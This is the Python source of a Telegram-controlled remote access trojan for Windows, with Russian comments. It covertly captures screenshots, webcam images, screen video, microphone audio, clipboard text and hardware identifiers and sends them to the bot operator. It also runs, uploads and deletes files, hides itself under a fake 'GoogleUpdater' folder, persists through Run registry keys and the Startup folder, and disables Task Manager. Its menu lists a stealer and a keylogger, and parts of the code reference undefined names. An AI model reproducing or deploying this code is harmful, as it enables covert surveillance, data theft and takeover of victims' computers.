import telebot
import pyautogui
import os
import json
import webbrowser
import shutil
import subprocess
import requests
import io
import time
import string
import threading
import asyncio
import logging
import socket
import platform
import psutil
import cv2
import ctypes
import pyttsx3
from pynput.keyboard import Controller as KeyboardController, Key, Listener
from pynput.mouse import Controller as MouseController, Button
from PIL import Image
from PyQt6.QtCore import Qt, QUrl
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QLineEdit, QMainWindow
from PyQt6.QtWebEngineWidgets import QWebEngineView
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import sys
import psutil
import random
import pygetwindow as gw
import win32api
import win32con
import win32gui
import win32process
import win32clipboard
import win32file
import win32com.client
import re
import winreg
import numpy as np
import sounddevice as sd
import wave
import pygame
import pyaudio
import urllib.request
import zipfile
import winshell
import winreg
import shlex
import wmi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ForceReply
TOKEN = "{TOKEN}"

bot = telebot.TeleBot(TOKEN)

# Главное меню
categories = {
    "user_interact": "🛠 User interact",
    "spying": "🕵️ Spying",
    "file_management": "📂 File Management",
    "windows_control": "💻 Windows Control",
    "internet_network": "🌐 Internet & Network",
    "graphics_fun": "🎨 Graphics & Fun",
    "console_processes": "⚙️ Console & Processes",
    "admin_other": "🛠 Admin & Other",
    "stilir": "🐦‍⬛ Stеаlеr",
    "bot_menu": "🤖 Bot menu"
}

def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for key, name in categories.items():
        markup.add(KeyboardButton(name))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Выберите категорию:", reply_markup=main_menu())

@bot.message_handler(func=lambda message: message.text in categories.values())
def menu_handler(message):
    category = [key for key, value in categories.items() if value == message.text][0]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    if category == "user_interact":
        markup.add(KeyboardButton("!sendtext"))
        markup.add(KeyboardButton("!mousemove"))
        markup.add(KeyboardButton("!changelang"))
        markup.add(KeyboardButton("!keybind"))
        markup.add(KeyboardButton("!textbox"))
        markup.add(KeyboardButton("!msgbox"))
    elif category == "spying":
        markup.add(KeyboardButton("!photo_desk"))
        markup.add(KeyboardButton("!photo_cam"))
        markup.add(KeyboardButton("!video_desk"))
        markup.add(KeyboardButton("!video_cam"))
        markup.add(KeyboardButton("!audiorec"))
        markup.add(KeyboardButton("!keylogger [⚠️FIXING]"))
        markup.add(KeyboardButton("!clipboard"))
        markup.add(KeyboardButton("!sysinfo"))
    elif category == "file_management":
        markup.add(KeyboardButton("!findfiles"))
        markup.add(KeyboardButton("!upload"))
        markup.add(KeyboardButton("!delete"))
        markup.add(KeyboardButton("!execute"))
        markup.add(KeyboardButton("!download"))
        markup.add(KeyboardButton("!disk"))
        markup.add(KeyboardButton("!autoload"))
    elif category == "windows_control":
        markup.add(KeyboardButton("!shutdown"))
        markup.add(KeyboardButton("!sleep"))
        markup.add(KeyboardButton("!restart"))
        markup.add(KeyboardButton("!lock"))
        markup.add(KeyboardButton("!volume"))
        markup.add(KeyboardButton("!lockmgr"))
        markup.add(KeyboardButton("!achbypass"))
        markup.add(KeyboardButton("!unlocksound"))
        markup.add(KeyboardButton("!Microlist"))
        markup.add(KeyboardButton("!swapkeys"))
    elif category == "internet_network":
        markup.add(KeyboardButton("!openurl"))
        markup.add(KeyboardButton("!wifilist"))
        markup.add(KeyboardButton("!ping"))
        markup.add(KeyboardButton("!packet"))
        markup.add(KeyboardButton("!netinfo"))
        markup.add(KeyboardButton("!wifipass"))
    elif category == "graphics_fun":
        markup.add(KeyboardButton("!fakeupdate"))
        markup.add(KeyboardButton("!draw"))
        markup.add(KeyboardButton("!wallpaper"))
        markup.add(KeyboardButton("!trail"))
        markup.add(KeyboardButton("!memz"))
        markup.add(KeyboardButton("!invert"))
        markup.add(KeyboardButton("!flipscreen"))
        markup.add(KeyboardButton("!cd"))
        markup.add(KeyboardButton("!rickroll"))
        markup.add(KeyboardButton("!tts"))
        markup.add(KeyboardButton("!sound"))
        markup.add(KeyboardButton("!shake"))
    elif category == "console_processes":
        markup.add(KeyboardButton("!tasklist"))
        markup.add(KeyboardButton("!taskkill"))
        markup.add(KeyboardButton("!taskmake"))
        markup.add(KeyboardButton("!cmd"))
        markup.add(KeyboardButton("!powershell"))
        markup.add(KeyboardButton("!bsod"))
    elif category == "admin_other":
        markup.add(KeyboardButton("!checkadmin"))
        markup.add(KeyboardButton("!admin"))
        markup.add(KeyboardButton("!legitadmin"))
        markup.add(KeyboardButton("!acbypass"))
        markup.add(KeyboardButton("!suicide"))
    elif category == "bot_menu":
        markup.add(KeyboardButton("!help"))
    elif category == "stilir":
        markup.add(KeyboardButton("!discordcheck"))
    markup.add(KeyboardButton("🔙 Назад"))
    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
def back_handler(message):
    bot.send_message(message.chat.id, "Выберите категорию:", reply_markup=main_menu())

#----ФУНКЦИИ СЮДА---

@bot.message_handler(func=lambda message: message.text == "!sendtext")
def sendtext_handler(message):
    msg = bot.send_message(message.chat.id, "Введите текст для ввода на клавиатуре:")
    bot.register_next_step_handler(msg, process_sendtext)

def process_sendtext(message):
    keyboard = KeyboardController()
    text = message.text
    for char in text:
        keyboard.type(char)
        time.sleep(0.05)
    bot.send_message(message.chat.id, f"✅ Введён текст: {text}")

from pynput.mouse import Controller as MouseController, Button

mouse = MouseController()

@bot.message_handler(func=lambda message: message.text == "!mousemove")
def mousemove_handler(message):
    msg = bot.send_message(message.chat.id, "Введите скорость движения мыши (например, 20):")
    bot.register_next_step_handler(msg, process_mousemove)

def process_mousemove(message):
    try:
        speed = int(message.text)
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton("⬅️"), KeyboardButton("➡️"))
        markup.add(KeyboardButton("⬆️"), KeyboardButton("⬇️"))
        markup.add(KeyboardButton("ЛКМ"), KeyboardButton("ПКМ"))
        markup.add(KeyboardButton("❌ Закрыть"))
        bot.send_message(message.chat.id, "Используйте кнопки для управления мышью:", reply_markup=markup)

        @bot.message_handler(func=lambda msg: msg.text in ["⬅️", "➡️", "⬆️", "⬇️", "ЛКМ", "ПКМ", "❌ Закрыть"])
        def move_mouse(msg):
            if msg.text == "⬅️":
                mouse.move(-speed, 0)
            elif msg.text == "➡️":
                mouse.move(speed, 0)
            elif msg.text == "⬆️":
                mouse.move(0, -speed)
            elif msg.text == "⬇️":
                mouse.move(0, speed)
            elif msg.text == "ЛКМ":
                mouse.click(Button.left)
            elif msg.text == "ПКМ":
                mouse.click(Button.right)
            elif msg.text == "❌ Закрыть":
                bot.send_message(msg.chat.id, "❌ Управление мышью отключено.", reply_markup=main_menu())
                return
            bot.register_next_step_handler(msg, move_mouse)

    except ValueError:
        bot.send_message(message.chat.id, "❌ Введите корректное число для скорости!")

@bot.message_handler(func=lambda message: message.text == "!changelang")
def changelang_handler(message):
    keyboard.press(Key.alt)
    keyboard.press(Key.shift)
    keyboard.release(Key.shift)
    keyboard.release(Key.alt)
    bot.send_message(message.chat.id, "✅ Язык клавиатуры изменён")

@bot.message_handler(func=lambda message: message.text == "!keybind")
def keybind_handler(message):
    msg = bot.send_message(message.chat.id, "Введите комбинацию клавиш (пример: Ctrl+Shift+Esc):")
    bot.register_next_step_handler(msg, process_keybind)

def process_keybind(message):
    try:
        keys = message.text.replace("+", " ")
        subprocess.run(["powershell", "-Command", f"(New-Object -ComObject WScript.Shell).SendKeys('{keys}')"], creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "✅ Комбинация клавиш выполнена.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

class TextBoxWindow(QWidget):
    def __init__(self, text, buttons, chat_id):
        super().__init__()
        self.chat_id = chat_id
        self.setWindowTitle("Input Box")
        self.setGeometry(200, 200, 400, 200)
        self.input_text = ""

        layout = QVBoxLayout()
        self.label = QLabel(text)
        layout.addWidget(self.label)

        self.input_field = QLineEdit(self)
        layout.addWidget(self.input_field)

        btn_layout = QHBoxLayout()
        for btn_text in buttons:
            btn = QPushButton(btn_text, self)
            btn.clicked.connect(lambda _, b=btn_text: self.on_button_click(b))
            btn_layout.addWidget(btn)
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def on_button_click(self, btn_text):
        self.input_text = self.input_field.text()
        bot.send_message(self.chat_id, f"**Выбрано:** {btn_text}\n**Введён текст:** {self.input_text}")
        self.close()

def run_gui(text, buttons, chat_id):
    app = QApplication(sys.argv)
    window = TextBoxWindow(text, buttons, chat_id)
    window.show()
    app.exec()

@bot.message_handler(func=lambda message: message.text == "!textbox")
def textbox_handler(message):
    msg = bot.send_message(message.chat.id, "Введите текст для окна ввода:")
    bot.register_next_step_handler(msg, process_textbox_text)

def process_textbox_text(message):
    text = message.text
    msg = bot.send_message(message.chat.id, "Введите кнопки через запятую (например: OK,Cancel):")
    bot.register_next_step_handler(msg, process_textbox_buttons, text, message.chat.id)

def process_textbox_buttons(message, text, chat_id):
    buttons = message.text.split(",") if message.text else ["OK"]
    threading.Thread(target=run_gui, args=(text, buttons, chat_id), daemon=True).start()
    bot.send_message(chat_id, "✅ Окно создано на ПК")

@bot.message_handler(func=lambda message: message.text == "!msgbox")
def msgbox_handler(message):
    msg = bot.send_message(message.chat.id, "Введите заголовок окна:")
    bot.register_next_step_handler(msg, process_msgbox_title)

def process_msgbox_title(message):
    title = message.text
    msg = bot.send_message(message.chat.id, "Введите текст сообщения:")
    bot.register_next_step_handler(msg, process_msgbox_text, title)

def process_msgbox_text(message, title):
    text = message.text
    script = f'''
    Add-Type -AssemblyName PresentationFramework;
    [System.Windows.MessageBox]::Show('{text}', '{title}');
    '''
    try:
        subprocess.Popen(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "✅ Сообщение отправлено в MSGBOX.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(func=lambda message: message.text == "!photo_desk")
def photo_desk_handler(message):
    try:
        screenshot = pyautogui.screenshot()
        image_binary = io.BytesIO()
        screenshot.save(image_binary, format="PNG")
        image_binary.seek(0)
        
        bot.send_photo(message.chat.id, image_binary, caption="🖥️ Экран 1")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

def capture_webcams():
    images = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened():
            break  # Если камера не открывается, значит, больше их нет
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.png', frame)
            images.append(io.BytesIO(img_encoded.tobytes()))
        cap.release()
        index += 1
    return images

@bot.message_handler(func=lambda message: message.text == "!photo_cam")
def photo_cam_handler(message):
    try:
        images = capture_webcams()
        if not images:
            bot.send_message(message.chat.id, "❌ Камеры недоступны!")
            return
        
        for i, image_binary in enumerate(images):
            image_binary.seek(0)
            bot.send_photo(message.chat.id, image_binary, caption=f"📸 Веб-камера #{i+1}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

#ffmpeg

FFMPEG_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "ffmpeg.exe")
VIDEO_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "data")
os.makedirs(VIDEO_PATH, exist_ok=True)

def download_ffmpeg():
    if not os.path.exists(FFMPEG_PATH):
        url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
        zip_path = os.path.join(VIDEO_PATH, "ffmpeg.zip")
        exe_dir = os.path.join(VIDEO_PATH, "ffmpeg")
        return url, zip_path, exe_dir
    return None, None, None

@bot.message_handler(func=lambda message: message.text == "!video_desk")
def video_desk_handler(message):
    msg = bot.send_message(message.chat.id, "⏳ Проверяем наличие FFMPEG...")
    url, zip_path, exe_dir = download_ffmpeg()
    
    if url:
        bot.edit_message_text("📥 Загружаем FFMPEG...", message.chat.id, msg.message_id)
        try:
            response = requests.get(url, stream=True)
            with open(zip_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            bot.edit_message_text("📂 Распаковываем...", message.chat.id, msg.message_id)
            subprocess.run(["powershell", "Expand-Archive", "-Path", zip_path, "-DestinationPath", exe_dir, "-Force"], creationflags=subprocess.CREATE_NO_WINDOW)
            
            ffmpeg_bin_path = os.path.join(exe_dir, "ffmpeg-7.1-essentials_build", "bin", "ffmpeg.exe")
            if os.path.exists(ffmpeg_bin_path):
                shutil.move(ffmpeg_bin_path, FFMPEG_PATH)
            else:
                bot.edit_message_text("❌ Ошибка: FFMPEG.exe не найден после распаковки", message.chat.id, msg.message_id)
                return
            
            os.remove(zip_path)
            bot.edit_message_text("✅ FFMPEG установлен!", message.chat.id, msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ Ошибка при установке: {e}", message.chat.id, msg.message_id)
            return
    else:
        bot.edit_message_text("✅ FFMPEG уже установлен", message.chat.id, msg.message_id)

    msg = bot.send_message(message.chat.id, "Введите длительность записи (например, 10s или 1m):")
    bot.register_next_step_handler(msg, process_video_duration)

def process_video_duration(message):
    time_map = {"s": 1, "m": 60}
    duration = message.text
    unit = duration[-1]

    if unit not in time_map or not duration[:-1].isdigit():
        bot.send_message(message.chat.id, "❌ Неверный формат времени! Используйте 10s или 1m.")
        return
    
    seconds = int(duration[:-1]) * time_map[unit]
    output_file = os.path.join(VIDEO_PATH, "output.mp4")

    bot.send_message(message.chat.id, "🎥 Запись началась...")

    try:
        command = f'"{FFMPEG_PATH}" -y -f gdigrab -framerate 30 -t {seconds} -i desktop "{output_file}"'
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        with open(output_file, "rb") as video:
            bot.send_video(message.chat.id, video)
        
        os.remove(output_file)
        bot.send_message(message.chat.id, "✅ Запись завершена и отправлена!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")


#ffmpeg


# Функция для записи аудио
def record_audio(microphone, duration, filename):
    p = pyaudio.PyAudio()

    # Открываем поток с микрофоном
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    input_device_index=microphone['index'],
                    frames_per_buffer=1024)

    print(f"Recording from {microphone['name']} for {duration} seconds...")

    frames = []
    for _ in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)

    # Завершаем запись
    print("Recording complete.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Сохраняем в файл
    if not os.path.exists(VIDEO_PATH):
        os.makedirs(VIDEO_PATH)

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

# Получаем список доступных микрофонов
def get_microphone_list():
    p = pyaudio.PyAudio()
    microphone_list = []
    for i in range(p.get_device_count()):
        device_info = p.get_device_info_by_index(i)
        if device_info.get('maxInputChannels') > 0:  # Только микрофоны
            microphone_list.append({
                'index': i,
                'name': device_info.get('name')
            })
    return microphone_list

# Обработка команд, начинающихся с "!"
@bot.message_handler(func=lambda message: message.text.startswith('!audiorec'))
def audiorec(message):
    bot.send_message(message.chat.id, "🎤 Пожалуйста, введите название микрофона:")

    # Сохраняем ID пользователя в состоянии ожидания ввода микрофона
    bot.register_next_step_handler(message, get_microphone)

def get_microphone(message):
    query = message.text.lower()  # Преобразуем запрос в нижний регистр
    microphones = get_microphone_list()
    found_mics = [mic for mic in microphones if query in mic['name'].lower()]

    if found_mics:
        mic = found_mics[0]  # Если нашли хотя бы один микрофон, выбираем первый из найденных
        bot.send_message(message.chat.id, f"✅ Нашли микрофон: {mic['name']}. Пожалуйста, введите длительность записи (например, 10s или 2m):")
        bot.register_next_step_handler(message, get_duration, mic)  # Переходим к следующему шагу
    else:
        bot.send_message(message.chat.id, "❌ Не удалось найти микрофон с таким названием. Попробуйте снова.")

def get_duration(message, microphone):
    duration_str = message.text

    # Разбор длительности
    try:
        if duration_str.endswith('s'):
            duration = int(duration_str[:-1])
        elif duration_str.endswith('m'):
            duration = int(duration_str[:-1]) * 60
        else:
            raise ValueError("❌ Неверный формат длительности. Используйте 's' или 'm'.")
    except ValueError as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")
        return

    # Запись аудио
    filename = os.path.join(VIDEO_PATH, "audio_recording.wav")
    record_audio(microphone, duration, filename)

    # Отправляем файл в Telegram
    with open(filename, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    # Удаляем файл после отправки
    os.remove(filename)

#--keyboard

@bot.message_handler(func=lambda message: message.text.startswith('!clipboard'))
def handle_clipboard(message):
    """Добавляет или показывает содержимое буфера обмена."""
    args = message.text.split(' ', 2)
    
    if len(args) < 2:
        bot.send_message(message.chat.id, "❌ Используйте: `!clipboard add <text>` или `!clipboard show`")
        return
    
    action = args[1].lower()
    
    if action == "add" and len(args) > 2:
        text = args[2]
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        bot.send_message(message.chat.id, "📋 Текст добавлен в буфер обмена!")

    elif action == "show":
        win32clipboard.OpenClipboard()
        try:
            clipboard_content = win32clipboard.GetClipboardData()
        except TypeError:
            clipboard_content = "[Пусто или неподдерживаемый формат]"
        win32clipboard.CloseClipboard()

        if len(clipboard_content) > 2000:
            clipboard_content = clipboard_content[:1990] + "..."

        bot.send_message(message.chat.id, f"📋 Содержимое буфера обмена: `{clipboard_content}`")

    else:
        bot.send_message(message.chat.id, "❌ Используйте: `!clipboard add <text>` или `!clipboard show`")

async def send_sysinfo(message):
    """Shows detailed system information."""
    try:
        uname = platform.uname()
        user = os.getlogin()
        pc_name = socket.gethostname()
        cpu_info = platform.processor()
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert to GB
        os_version = f"{uname.system} {uname.release} ({uname.version})"
        arch = platform.architecture()[0]
        disk_usage = psutil.disk_usage("/")
        gpu_info = "Unknown"
        cpu_serial = "Unknown"
        cpu_frequency = "Unknown"
        motherboard = "Unknown"
        disk_serial = "Unknown"
        gpu_vram = "Unknown"
        mac_addresses = []

        # Getting system information via WMI
        try:
            w = wmi.WMI()

            # CPU details
            cpu = w.Win32_Processor()[0]
            cpu_info = cpu.Name.strip()
            cpu_serial = cpu.ProcessorId.strip()
            cpu_frequency = f"{cpu.MaxClockSpeed} MHz"

            # GPU details
            gpus = w.Win32_VideoController()
            if gpus:
                gpu_info = ", ".join(gpu.Name.strip() for gpu in gpus)
                vram_list = []
                for gpu in gpus:
                    if gpu.AdapterRAM is not None:
                        vram_list.append(f"{int(gpu.AdapterRAM / (1024**3))} GB")
                    else:
                        vram_list.append("Unknown")
                gpu_vram = ", ".join(vram_list)

            # Motherboard details
            board = w.Win32_BaseBoard()[0]
            motherboard = f"{board.Manufacturer.strip()} {board.Product.strip()}"

            # Disk details
            disk = w.Win32_DiskDrive()[0]
            disk_serial = disk.SerialNumber.strip()

        except Exception as e:
            gpu_info = "WMI error"
            gpu_vram = "WMI error"

        # Getting MAC addresses
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac_addresses.append(f"{iface}: {addr.address}")

        mac_addresses_str = "\n".join(mac_addresses) if mac_addresses else "No MAC addresses found"

        # Check admin rights
        is_admin = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No"

        # Get the script's full path
        exe_path = os.path.abspath(sys.argv[0])

        info_message = (
            f"🖥 **System Information**\n"
            f"🔹 OS: `{os_version}`\n"
            f"🔹 Architecture: `{arch}`\n"
            f"🔹 User: `{user}`\n"
            f"🔹 PC Name: `{pc_name}`\n"
            f"🔹 Admin Rights: `{is_admin}`\n"
            f"🔹 Executable Path: `{exe_path}`\n\n"
            f"⚙ **Hardware**\n"
            f"🔹 CPU: `{cpu_info}`\n"
            f"🔹 CPU Frequency: `{cpu_frequency}`\n"
            f"🔹 CPU Serial: `{cpu_serial}`\n"
            f"🔹 Cores: `{cpu_cores}` | Threads: `{cpu_threads}`\n"
            f"🔹 RAM: `{total_ram} GB`\n"
            f"🔹 GPU: `{gpu_info}`\n"
            f"🔹 GPU VRAM: `{gpu_vram}`\n"
            f"🔹 Disk Usage: `{disk_usage.percent}% used`\n"
            f"🔹 Disk Serial: `{disk_serial}`\n"
            f"🔹 Motherboard: `{motherboard}`\n\n"
            f"🌐 **Network**\n"
            f"```{mac_addresses_str}```"
        )

        bot.send_message(message.chat.id, info_message)
    except Exception as e:
        await bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!sysinfo'))
def handle_sysinfo(message):
    # Вместо синхронного вызова, делаем асинхронный через asyncio
    asyncio.run(send_sysinfo(message))

@bot.message_handler(func=lambda message: message.text.startswith('!upload'))
def upload(message):
    """Uploads a file to the Telegram chat."""
    # Путь к файлу, который будет загружен
    file_path = message.text.split(' ', 1)[-1]  # Получаем путь к файлу из текста команды

    if not os.path.exists(file_path):
        bot.send_message(message.chat.id, "❌ File not found!")
        return

    try:
        # Отправляем файл в Telegram
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)

        bot.send_message(message.chat.id, f"✅ File `{os.path.basename(file_path)}` uploaded successfully!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error uploading file: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!delete'))
def handle_delete(message):
    """Удаляет файл по пути, указанному в сообщении."""
    # Извлекаем путь к файлу из текста сообщения
    file_path = message.text.split(' ', 1)[-1]

    if not file_path or not os.path.exists(file_path):
        bot.send_message(message.chat.id, "❌ File not found!")
        return

    try:
        os.remove(file_path)
        bot.send_message(message.chat.id, f"✅ File {file_path} deleted successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error deleting file: {e}")

# Функция для выполнения файла
def execute_file(file_path):
    try:
        subprocess.run([file_path], check=True)
    except Exception as e:
        return f"❌ Error executing file: {e}"
    return f"✅ Executed file: {file_path}"

# Функция для скачивания файла
def download_file(url, path):
    try:
        response = requests.get(url, stream=True)
        with open(path, 'wb') as file:
            file.write(response.content)
        return f"✅ File downloaded to {path}"
    except Exception as e:
        return f"❌ Error downloading file: {e}"

# Обработчик для команды execute
@bot.message_handler(func=lambda message: message.text.startswith('!execute'))
def handle_execute(message):
    """Выполняет файл по указанному пути."""
    file_path = message.text.split(' ', 1)[-1]
    if not file_path or not os.path.exists(file_path):
        bot.send_message(message.chat.id, "❌ File not found!")
        return
    result = execute_file(file_path)
    bot.send_message(message.chat.id, result)

# Обработчик для команды download
@bot.message_handler(func=lambda message: message.text.startswith('!download'))
def handle_download(message):
    """Скачивает файл по URL и сохраняет в указанную директорию."""
    try:
        url, path = message.text.split(' ', 2)[1], message.text.split(' ', 2)[2]
        result = download_file(url, path)
        bot.send_message(message.chat.id, result)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid format! Use !download <url> <path>")


# Словарь для хранения текущего пути каждого пользователя
user_paths = {}

# Функция нормализации пути
def normalize_path(path):
    return path.replace("\\", "/")

# Обработчик команды !disk
@bot.message_handler(func=lambda message: message.text.startswith('!disk'))
def handle_disk_command(message):
    user_id = message.from_user.id  # Идентификатор пользователя
    if user_id not in user_paths:
        user_paths[user_id] = os.getcwd()  # Изначально путь пользователя - это текущая директория

    # Получаем аргументы команды
    args = message.text[6:].strip()

    if args:
        # Если передан путь, пробуем перейти к указанному
        new_path = args
        if os.path.isdir(new_path):
            user_paths[user_id] = new_path  # Обновляем путь пользователя
            response = f"🔹 Current path updated to: `{normalize_path(new_path)}`"
        else:
            response = f"❌ Path `{normalize_path(new_path)}` not found"
    else:
        response = f"❌ No path provided."

    try:
        current_path = user_paths[user_id]  # Используем путь, связанный с пользователем
        items = os.listdir(current_path)  # Получаем список файлов и папок
        folders = [d for d in items if os.path.isdir(os.path.join(current_path, d))]  # Фильтруем папки
        files = [f for f in items if os.path.isfile(os.path.join(current_path, f))]  # Фильтруем файлы

        response += f"\n📂 **Data in {normalize_path(current_path)}**:\n"

        if folders:
            response += "\n📁 **Folders:**\n" + "\n".join(f"🔹 `{normalize_path(os.path.join(current_path, folder))}`" for folder in folders)
        else:
            response += "\n❌ No folders."

        if files:
            response += "\n\n📄 **Files:**\n" + "\n".join(f"📜 `{normalize_path(os.path.join(current_path, file))}`" for file in files)
        else:
            response += "\n\n❌ No files."

        bot.send_message(message.chat.id, response)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

# Определяем путь к программе
PROGRAM_PATH = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

# Методы автозапуска
AUTOSTART_METHODS = {
    "user": (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "machine": (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "wow6432node": (winreg.HKEY_LOCAL_MACHINE, r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    "startup_folder": os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
}

def set_autoload(name: str, method: str, enable: bool):
    """Добавляет или удаляет программу из автозагрузки разными методами"""
    if method not in AUTOSTART_METHODS:
        return "❓ **Methods:** `user`, `machine`, `wow6432node`, `startup_folder`"

    if method == "startup_folder":
        shortcut_path = os.path.join(AUTOSTART_METHODS[method], f"{name}.lnk")
        if enable:
            try:
                shell = Dispatch("WScript.Shell")
                shortcut = shell.CreateShortcut(shortcut_path)
                shortcut.TargetPath = PROGRAM_PATH
                shortcut.WorkingDirectory = os.path.dirname(PROGRAM_PATH)
                shortcut.Save()

                return f"✅ **Added startup `{method}`!**"
            except Exception as e:
                return f"🔴 **Error:** `{e}`"
        else:
            try:
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
                return f"❌ **Removed Startup `{method}`!**"
            except Exception as e:
                return f"🔴 **Error:** `{e}`"

    else:
        hive, key = AUTOSTART_METHODS[method]
        try:
            with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE if enable else winreg.KEY_ALL_ACCESS) as reg_key:
                if enable:
                    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, PROGRAM_PATH)
                else:
                    winreg.DeleteValue(reg_key, name)
        except FileNotFoundError:
            pass  # Пропускаем, если ключ уже удален
        except Exception as e:
            return f"🔴 **Error:** `{e}`"

        return f"✅ **Added Startup `{method}`!**" if enable else f"❌ **Removed Startup `{method}`!"


@bot.message_handler(func=lambda message: message.text.startswith('!autoload'))
def handle_autoload(message):
    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, "⚠️ **Incorrect** usage. Example: `!autoload <name> <method> <on/off>`\n"
                              "**Methods:** `user`, `machine`, `wow6432node`, `startup_folder`")
        return

    name, method, mode = args[1], args[2], args[3].lower()

    if mode == "on":
        result = set_autoload(name, method, True)
    elif mode == "off":
        result = set_autoload(name, method, False)
    else:
        bot.reply_to(message, "⚠️ **Use `<on/off>`!**")
        return

    bot.reply_to(message, result)

@bot.message_handler(func=lambda message: message.text.startswith('!shutdown'))
def shutdown(message):
    """Выключить ПК."""
    bot.reply_to(message, "💤 Shutdown...")
    os.system("shutdown /s /t 0")

# Обработчик для команды !restart
@bot.message_handler(func=lambda message: message.text.startswith('!restart'))
def restart(message):
    """Перезагрузить ПК."""
    bot.reply_to(message, "💫 Restarting...")
    os.system("shutdown /r /t 0")

# Обработчик для команды !lock
@bot.message_handler(func=lambda message: message.text.startswith('!lock'))
def lock(message):
    """Заблокировать экран."""
    bot.reply_to(message, "🔒 Locked screen...")
    ctypes.windll.user32.LockWorkStation()

# Обработчик для команды !lockmgr
@bot.message_handler(func=lambda message: message.text.startswith('!lockmgr'))
def lockmgr(message):
    """Отключить или включить Task Manager."""
    if message.chat.id != AUTHORIZED_CHANNEL_ID:
        return bot.reply_to(message, "❌ Unauthorized channel!")

    state = message.text.split()[1] if len(message.text.split()) > 1 else ''
    if state not in ['on', 'off']:
        return bot.reply_to(message, "⚠️ **Usage:** !lockmgr <on/off>")

    try:
        command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f" if state == "on" else "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f"
        subprocess.run(command, shell=True)
        bot.reply_to(message, f"✅ Task Manager {'disabled' if state == 'on' else 'enabled'}.")
    except Exception as e:
        bot.reply_to(message, f"❌ ERROR: {e}")

# Функция для включения/выключения звука
def mute_system_sound(mute=True):
    device_id = 0  # Обычно основное устройство вывода
    mute_flag = 1 if mute else 0
    try:
        ctypes.windll.winmm.waveOutSetVolume(device_id, mute_flag * 0xFFFF)
        return True
    except Exception as e:
        return False

# Функция для проверки состояния звука
def is_sound_muted():
    try:
        volume = ctypes.c_uint()
        ctypes.windll.winmm.waveOutGetVolume(0, ctypes.byref(volume))
        return volume.value == 0
    except Exception as e:
        return None

# Обработчик для команды !unlocksound
@bot.message_handler(func=lambda message: message.text.startswith('!unlocksound'))
def unlocksound(message):
    muted = is_sound_muted()
    if muted is None:
        bot.reply_to(message, "❌ Can't find sound info")
    elif muted:
        if mute_system_sound(False):
            bot.reply_to(message, "🔊 Unlocked sound!")
        else:
            bot.reply_to(message, "❌ Can't unblock sound")
